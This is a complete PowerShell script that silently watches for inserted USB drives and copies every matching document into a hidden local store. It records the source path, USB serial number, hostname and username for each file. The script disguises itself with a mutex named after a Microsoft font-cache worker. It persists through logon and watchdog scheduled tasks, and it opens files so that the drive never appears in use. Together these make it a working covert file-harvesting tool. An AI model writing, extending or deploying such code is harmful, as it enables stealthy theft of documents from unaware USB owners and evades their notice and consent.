#Requires -Version 5.1
<#
.SYNOPSIS
    Silent USB document ingestion with SHA-256 deduplication.

.DESCRIPTION
    Detects new removable drives (lightweight poll every 5s).
    On new drive: adaptive settle wait (up to 30s, exits early once accessible), then:
      Phase 1+2 — streaming pipeline: enumerate matching files and hash + atomic copy inline
    Named mutex prevents concurrent instances. Structured logging with rotation.

.NOTES
    DEPLOYMENT: deploy.bat should register BOTH an /sc onlogon trigger AND an
    /sc minute /mo 5 watchdog trigger (separate task name). The named mutex
    (Global\MsftFontCacheWorker_Mutex) prevents duplicate instances, so the
    5-minute trigger simply acts as a crash-recovery watchdog.
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ========================== CONFIG ==========================

$ScriptDir  = Split-Path -Parent $MyInvocation.MyCommand.Definition
$ConfigPath = Join-Path $ScriptDir 'config.json'
if (-not (Test-Path $ConfigPath)) {
    $ConfigPath = Join-Path (Split-Path -Parent $ScriptDir) 'config.json'
}
if (-not (Test-Path $ConfigPath)) { exit 1 }

$Config = Get-Content $ConfigPath -Raw | ConvertFrom-Json

$Dest          = [Environment]::ExpandEnvironmentVariables($Config.destinationPath)
$Extensions    = @($Config.extensions)
$SleepSeconds  = $Config.sleepSeconds
$LogMaxBytes   = [long]($Config.log.maxSizeMB) * 1MB
$LogRetention  = $Config.log.retentionCount
$FileSizeCap    = [long]($Config.fileSizeCapMB) * 1MB
$PollInterval   = 5
$RescanMinutes  = if ($null -ne $Config.rescanMinutes) { [int]$Config.rescanMinutes } else { 5 }

$DbPath  = Join-Path $Dest 'hash_db.txt'
$LogPath = Join-Path $Dest 'sync_log.txt'

# ========================== MUTEX ==========================

$MutexName = 'Global\MsftFontCacheWorker_Mutex'
$Mutex = $null
$MutexOwned = $false

try {
    $Mutex = New-Object System.Threading.Mutex($false, $MutexName)
    $MutexOwned = $Mutex.WaitOne(0)
} catch [System.Threading.AbandonedMutexException] {
    $MutexOwned = $true
}

if (-not $MutexOwned) {
    exit 0
}

# ========================== INIT ==========================

if (-not (Test-Path $Dest)) {
    New-Item -ItemType Directory -Force -Path $Dest | Out-Null
}
if (-not (Test-Path $DbPath)) {
    New-Item -ItemType File -Path $DbPath | Out-Null
}
if (-not (Test-Path $LogPath)) {
    New-Item -ItemType File -Path $LogPath | Out-Null
}

# Load hash DB into memory (O(1) lookups)
$HashSet = New-Object 'System.Collections.Generic.HashSet[string]'(
    [System.StringComparer]::OrdinalIgnoreCase
)

foreach ($line in [System.IO.File]::ReadAllLines($DbPath)) {
    $trimmed = $line.Trim()
    if ($trimmed.Length -eq 64) {
        [void]$HashSet.Add($trimmed)
    }
}

# Batch flush buffer for new hashes (avoids per-file disk I/O)
$Script:PendingHashes = New-Object 'System.Collections.Generic.List[string]'

# Scanned drives tracker: drive letter -> last scan time
$Script:ScannedDrives = @{}

# ========================== NON-BLOCKING HASH ========================

function Get-FileHashNonBlocking {
    param([string]$Path)

    # Open with FileShare.ReadWrite+Delete so Windows never considers
    # the USB "in use" — allows safe eject at any moment
    $stream = $null
    try {
        $stream = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
        )
        $hasher = [System.Security.Cryptography.SHA256]::Create()
        $bytes  = $hasher.ComputeHash($stream)
        return [BitConverter]::ToString($bytes).Replace('-', '')
    } finally {
        if ($null -ne $stream) { $stream.Dispose() }
    }
}

# ========================== NON-BLOCKING COPY ========================

function Copy-NonBlocking {
    param([string]$Source, [string]$Destination)
    $src = [System.IO.File]::Open(
        $Source, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read,
        [System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete
    )
    try {
        $dst = [System.IO.File]::Create($Destination)
        try { $src.CopyTo($dst) }
        finally { $dst.Dispose() }
    } finally { $src.Dispose() }
}

# ========================== LOGGING ==========================

function Write-Log {
    param([string]$Action, [string]$Detail)
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try {
        Add-Content -LiteralPath $LogPath -Value "$ts | $Action | $Detail" -Encoding UTF8
    } catch { }
}

function Invoke-LogRotation {
    try {
        $logFile = Get-Item -LiteralPath $LogPath -ErrorAction SilentlyContinue
        if ($null -eq $logFile -or $logFile.Length -lt $LogMaxBytes) { return }

        # Rotate: sync_log.3.txt -> deleted, .2 -> .3, .1 -> .2, current -> .1
        for ($i = $LogRetention; $i -ge 1; $i--) {
            $older = Join-Path $Dest "sync_log.$i.txt"
            if ($i -eq $LogRetention) {
                Remove-Item -LiteralPath $older -ErrorAction SilentlyContinue
            }
            if ($i -gt 1) {
                $newer = Join-Path $Dest "sync_log.$($i - 1).txt"
                if (Test-Path $newer) {
                    Move-Item -LiteralPath $newer -Destination $older -Force
                }
            }
        }

        $first = Join-Path $Dest 'sync_log.1.txt'
        Move-Item -LiteralPath $LogPath -Destination $first -Force
        New-Item -ItemType File -Path $LogPath | Out-Null

    } catch {
        # Rotation failed — continue with current log
    }
}

# ========================== USB DISCOVERY ==========================

function Get-RemovableDrives {
    try {
        $drives = Get-CimInstance Win32_LogicalDisk |
            Where-Object { $_.DriveType -eq 2 } |
            Select-Object -ExpandProperty DeviceID
        return @($drives)
    } catch {
        return @()
    }
}

# ========================== ADAPTIVE SETTLE ==========================

function Wait-DriveReady {
    param([string]$Drive, [int]$TimeoutSeconds = 30, [int]$IntervalSeconds = 2)

    $drivePath = "${Drive}\"
    $elapsed = 0

    while ($elapsed -lt $TimeoutSeconds -and $Script:Running) {
        if (Test-Path $drivePath) {
            Write-Log 'DRIVE_READY' "$Drive | settled in ${elapsed}s"
            return $true
        }
        Start-Sleep -Seconds $IntervalSeconds
        $elapsed += $IntervalSeconds
    }

    Write-Log 'DRIVE_TIMEOUT' "$Drive | not accessible after ${TimeoutSeconds}s"
    return $false
}

# ========================== HASH PERSISTENCE (BATCH FLUSH) ==========================

function Save-HashToMemory {
    param([string]$Hash)

    if ($HashSet.Add($Hash)) {
        $Script:PendingHashes.Add($Hash)
    }
}

function Flush-PendingHashes {
    if ($Script:PendingHashes.Count -eq 0) { return }

    try {
        # Single write operation for all new hashes accumulated this cycle
        $content = [string]::Join([Environment]::NewLine, $Script:PendingHashes)
        Add-Content -LiteralPath $DbPath -Value $content -Encoding UTF8
    } catch {
        # Persist failed — hashes are in memory, will accumulate more next cycle
    }

    $Script:PendingHashes.Clear()
}

# ========================== PROVENANCE METADATA ==========================

function Write-Metadata {
    param(
        [string]$DestFile,
        [string]$SourcePath,
        [string]$Hash,
        [string]$DriveLetter,
        [System.IO.FileInfo]$SourceInfo
    )

    $metaPath = "$DestFile.meta.json"
    if (Test-Path $metaPath) { return }

    $usbSerial = 'UNKNOWN'
    try {
        $disk = Get-CimInstance Win32_DiskDrive |
            Where-Object { $_.InterfaceType -eq 'USB' } |
            Select-Object -First 1
        if ($null -ne $disk) {
            $usbSerial = $disk.SerialNumber
        }
    } catch { }

    $meta = [ordered]@{
        hash             = $Hash
        sourcePath       = $SourcePath
        sourceDrive      = $DriveLetter
        usbSerial        = $usbSerial
        originalCreated  = $SourceInfo.CreationTimeUtc.ToString('o')
        originalModified = $SourceInfo.LastWriteTimeUtc.ToString('o')
        originalSize     = $SourceInfo.Length
        ingestedAt       = (Get-Date).ToUniversalTime().ToString('o')
        hostname         = $env:COMPUTERNAME
        username         = $env:USERNAME
    }

    try {
        $meta | ConvertTo-Json -Depth 2 | Set-Content -LiteralPath $metaPath -Encoding UTF8
    } catch { }
}

# ========================== ATOMIC COPY ==========================

function Copy-FileAtomically {
    param(
        [string]$SourcePath,
        [string]$Hash,
        [string]$DriveLetter,
        [System.IO.FileInfo]$SourceInfo
    )

    $name = Split-Path $SourcePath -Leaf
    $finalPath = Join-Path $Dest "${Hash}_${name}"
    $tmpPath   = "${finalPath}.tmp"

    # Already exists (from previous run with intact hash DB)
    if (Test-Path $finalPath) { return $true }

    try {
        Copy-NonBlocking -Source $SourcePath -Destination $tmpPath

        $copyHash = (Get-FileHash -LiteralPath $tmpPath -Algorithm SHA256).Hash
        if ($copyHash -ne $Hash) {
            Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
            Write-Log 'ERROR_VERIFY' "$SourcePath | expected=$Hash got=$copyHash"
            return $false
        }

        # Step 3: Atomic rename (same volume = atomic on NTFS)
        Move-Item -LiteralPath $tmpPath -Destination $finalPath -Force

        # Step 4: Provenance sidecar
        Write-Metadata -DestFile $finalPath -SourcePath $SourcePath `
                        -Hash $Hash -DriveLetter $DriveLetter -SourceInfo $SourceInfo

        return $true
    } catch {
        Remove-Item -LiteralPath $tmpPath -Force -ErrorAction SilentlyContinue
        return $false
    }
}

# ========================== GRACEFUL SHUTDOWN ==========================

$Script:Running = $true

$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    $Script:Running = $false
}

try {
    [Console]::TreatControlCAsInput = $false
    $handler = [System.ConsoleCancelEventHandler]{
        param($s, $e); $e.Cancel = $true; $Script:Running = $false
    }
    [Console]::add_CancelKeyPress($handler)
} catch { }

# ========================== MAIN LOOP ==========================
#
# - Poll drive letters every 5s (instant, zero disk I/O)
# - NEW drive detected → adaptive settle wait (up to 30s, exits early) → scan
# - Streaming pipeline: enumerate + hash + atomic copy inline (no materialization)
# - Scanned drives tracked to avoid redundant re-scans within rescanMinutes

Write-Log 'INIT' "HashSet loaded with $($HashSet.Count) entries | rescanMinutes=$RescanMinutes"

$KnownDrives = @()

while ($Script:Running) {

    Invoke-LogRotation

    $currentDrives = Get-RemovableDrives
    $newDrives     = @($currentDrives | Where-Object { $_ -notin $KnownDrives })
    $KnownDrives   = $currentDrives

    # Clean up ScannedDrives for removed drives
    $removedDrives = @($Script:ScannedDrives.Keys | Where-Object { $_ -notin $currentDrives })
    foreach ($rd in $removedDrives) {
        $Script:ScannedDrives.Remove($rd)
    }

    # New USB detected — adaptive settle wait
    if ($newDrives.Count -gt 0) {
        Write-Log 'USB_DETECTED' ($newDrives -join ', ')
        foreach ($nd in $newDrives) {
            if (-not $Script:Running) { break }
            Wait-DriveReady -Drive $nd -TimeoutSeconds $SleepSeconds
        }
        if (-not $Script:Running) { break }
    }

    # Decide what to scan (per-drive rescan tracking)
    $drivesToScan = @()
    $now = Get-Date

    foreach ($d in $currentDrives) {
        if ($d -in $newDrives) {
            # Newly inserted — always scan
            $drivesToScan += $d
        } elseif (-not $Script:ScannedDrives.ContainsKey($d)) {
            # Never scanned in this session — scan it
            $drivesToScan += $d
        } elseif (($now - $Script:ScannedDrives[$d]).TotalMinutes -ge $RescanMinutes) {
            # Stale scan — rescan
            $drivesToScan += $d
        }
    }

    if ($drivesToScan.Count -eq 0) {
        Start-Sleep -Seconds $PollInterval
        continue
    }

    foreach ($drive in $drivesToScan) {

        if (-not $Script:Running) { break }

        $drivePath = "${drive}\"
        if (-not (Test-Path $drivePath)) { continue }

        # ---- STREAMING PIPELINE: Enumerate + Hash + Copy inline ----
        Write-Log 'SCAN_START' $drive

        $copied = 0; $skipped = 0; $errors = 0; $total = 0

        try {
            Get-ChildItem -LiteralPath $drivePath -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object {
                ($Extensions -contains $_.Extension.ToLower()) -and
                ($_.Length -le $FileSizeCap) -and
                ($_.Length -gt 0)
            } |
            ForEach-Object {
                if (-not $Script:Running) { return }

                $file = $_
                $total++

                try {
                    $hash = Get-FileHashNonBlocking $file.FullName

                    if ($HashSet.Contains($hash)) {
                        $skipped++
                        return
                    }

                    $ok = Copy-FileAtomically -SourcePath $file.FullName `
                                               -Hash $hash `
                                               -DriveLetter $drive `
                                               -SourceInfo $file

                    if ($ok) {
                        Save-HashToMemory $hash
                        Write-Log 'COPIED' "$($file.FullName) | $hash"
                        $copied++
                    } else {
                        Write-Log 'ERROR_COPY' $file.FullName
                        $errors++
                    }
                } catch {
                    Write-Log 'ERROR_FILE' "$($file.FullName) | $($_.Exception.Message)"
                    $errors++
                }
            }
        } catch {
            Write-Log 'ERROR_ENUM' "$drive | $($_.Exception.Message)"
        }

        # Flush all accumulated hashes for this drive in one write
        Flush-PendingHashes

        # Mark drive as scanned
        $Script:ScannedDrives[$drive] = Get-Date

        Write-Log 'SCAN_DONE' "$drive | total=$total copied=$copied skipped=$skipped errors=$errors"
    }

    if ($Script:Running) {
        Start-Sleep -Seconds $PollInterval
    }
}

# ========================== CLEANUP ==========================

# Final flush of any remaining pending hashes
Flush-PendingHashes

Write-Log 'SHUTDOWN' 'Graceful exit'

if ($null -ne $Mutex) {
    if ($MutexOwned) { $Mutex.ReleaseMutex() }
    $Mutex.Dispose()
}
